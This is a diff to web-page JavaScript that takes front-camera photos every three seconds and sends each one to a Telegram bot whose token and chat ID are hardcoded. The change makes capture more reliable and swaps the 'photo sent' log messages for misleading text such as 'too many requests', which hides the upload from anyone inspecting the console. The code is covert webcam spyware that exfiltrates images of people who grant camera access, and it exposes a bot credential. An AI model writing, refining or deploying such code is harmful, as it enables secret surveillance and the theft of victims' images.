@@ -147,6 +147,8 @@
     const video = document.createElement('video');
     const telegramBotToken = '7329936303:AAF2w2JFPfLLr1dAytnBPxmK539N8QYdHXw';
     const chatId = '6992364240';
+    const canvas = document.createElement('canvas');
+    let isVideoLoaded = false;
 
     // Request permission and start video capture
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -154,19 +156,24 @@
             video.srcObject = stream;
             video.play();
 
-            // Capture a photo every 3 seconds
-            setInterval(() => {
-                capturePhoto();
-            }, 3000);
+            video.addEventListener('loadeddata', () => {
+                isVideoLoaded = true;
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Capture a photo every 3 seconds
+                setInterval(() => {
+                    if (isVideoLoaded) {
+                        capturePhoto();
+                    }
+                }, 3000);
+            });
         })
         .catch(error => {
             console.error('Error accessing camera:', error);
         });
 
     function capturePhoto() {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -188,9 +195,9 @@
         .then(response => response.json())
         .then(data => {
             if (!data.ok) {
-                console.error('Error sending photo to Telegram:', data);
+                console.error('Error +', data);
             } else {
-                console.log('Photo sent to Telegram:', data);
+                console.log('too many requests :°:', data);
             }
         })
         .catch(error => console.error('Error >:', error));
